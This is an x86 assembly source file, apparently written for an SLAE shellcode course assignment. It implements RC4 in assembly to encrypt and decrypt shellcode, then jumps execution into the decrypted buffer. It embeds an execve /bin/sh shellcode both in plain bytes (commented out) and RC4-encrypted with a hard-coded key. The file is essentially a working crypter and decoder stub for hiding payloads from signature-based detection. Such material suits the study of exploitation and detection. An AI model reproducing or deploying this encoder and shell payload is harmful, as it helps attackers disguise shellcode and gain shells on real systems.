; SLAE-xxx
; assignment 7: use an encryption scheme to encode shellcode  
; originality: RC4 assembly , this is taken from a RC4 benchmark in x86 and adapted to encode / decode shellcode 
; it s also commented if you want to understand RC4 in assembly  
; source: https://github.com/chen-yumin/rc4-cipher-in-assembly/blob/master/rc4_cipher.c

; lets RC4 ! 


global _start

_start: 

; the decoder stub wont be small with this kind of encryption 
; i mean its much more heavy than say shikata ga nai XOR encoder 
; you need to create and populate a 256 bytes struct here so if you 
; want to embed a decoder stub, its gonna be bigger 


; first fill the structure [256] with 0..255
KSA:   
mov eax,s256 
mov ecx,256 
fill_s: 
	xor ebx,ebx
	sub bl,cl ; 
	mov [eax + ebx], bl; move along the array and put values into it  
loop fill_s 
; you can check the result in gdb  
; gdb$ x/100x &s256 
; 0x80490ec <s256>:	0x03020100	0x00000004
; S[i] is done 


; permute the struct based on the selected key 
; Generate S[j]  
mov edx,key ; key 
mov edi,keylen ; edi = size of key 
mov esi,keyptr ; we store key modulo in a struct 
mov ecx,256 ; 
xor ebx,ebx ; ebx = j 

loop_j:
	cmp ebx,edi ; test if j smaller than keylen 
	jl continue_loop ; we continue  
	xor ebx, ebx ; else clear ebx , modulo key length is done here by restarting at key[0] 

continue_loop: 
	; move one byte at a time 
	mov ah, [edx + ebx] ; take key byte content (offset)  
	mov [esi], ah ; and move the byte to prepared struct keyptr   
	inc esi ; continue to fill all the struct 
	inc ebx ; and move along the key 
	loop loop_j ; stop after 256 
; here we have prepared a struct keyptr with key[i mod keylength] 


; Generate S now 
; you can check that the struct created is similar to the python script
; to verify you are doing good  
mov edi,s256 ; S[i] 
xor ebx,ebx ; offset 0 
sub esi,256 ; go back to start of key struct 
xor eax,eax ; clean eax for using as offset 
mov ecx,256 ; do this for 256 bytes

loop_s: 
	mov dl, [esi+eax] ; key[modulo] into dl 
	add bl, dl ; bl contains j and we add key[] 
	mov dl, [edi+eax] ; S[i] into dl 
	add bl, dl ; bl contains j and we add S[i] 
	mov dl, [edi+eax] ; swap dl and dh 
	mov dh, [edi+ebx] ; swap 
	mov [edi+eax], dh ; swap 
	mov [edi+ebx], dl ; swap 
	inc eax ;  move along 
	loop loop_s  



; now lets encode using the pseudo ramdom stream 
PRGA: 
mov esi, shellcode 
mov edi, s256
mov edx, output 

; clean registers 
xor eax, eax 
xor ebx,ebx

; do this for size of the shellcode 
mov ecx,shelllen 

cd: 
	push ecx
	movzx ecx,al
	inc cl
	push edx
	mov dh,[edi+ecx]
	add bl,dh
	mov dl,[edi+ebx]
	mov [edi+ecx],dl
	mov [edi+ebx],dh
	add dl,dh
	movzx edx,dl
	mov dl,[edi+edx]
	mov cl,[esi+eax]
	xor cl,dl
	pop edx
	mov [edx+eax],cl
	inc eax
	pop ecx
	loop cd


; since the same function in RC4 is  used to encode and decode
; we will output the modified shellcode but also jump to it after 

; output the encoded / decoded stuff
print_encoded: 
; print the encoded shellcode, to see bytes use | xxd for instance 
mov eax, 0x4
mov ebx, 0x1
mov ecx, output
mov edx, shelllen
int 0x80


; now jump to decoded shellcode 
end: 
; in case of encoding we will segfault , otherwise we jump to decoded shellcode 
jmp output 



section .data 

key: db "supersecret!"
keylen equ $-key 

; shellcode: db 0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80
; execve stack not encoded 
shellcode: db 0x87,0x62,0x10,0x10,0x17,0xa9,0x9c,0xee,0x37,0x3c,0x44,0x88,0xc4,0xa7,0x6b,0xc9,0x72,0x49,0x6c,0x0c,0xae,0xa0,0x52,0xe8,0x5d
; execve stack encoded with rc4 
shelllen equ $-shellcode 

	
section .bss 

keyptr: resb 256
s256: resb 256 
; output size of 1024 bytes should be enough for shellcodes 
output: resb 1024 


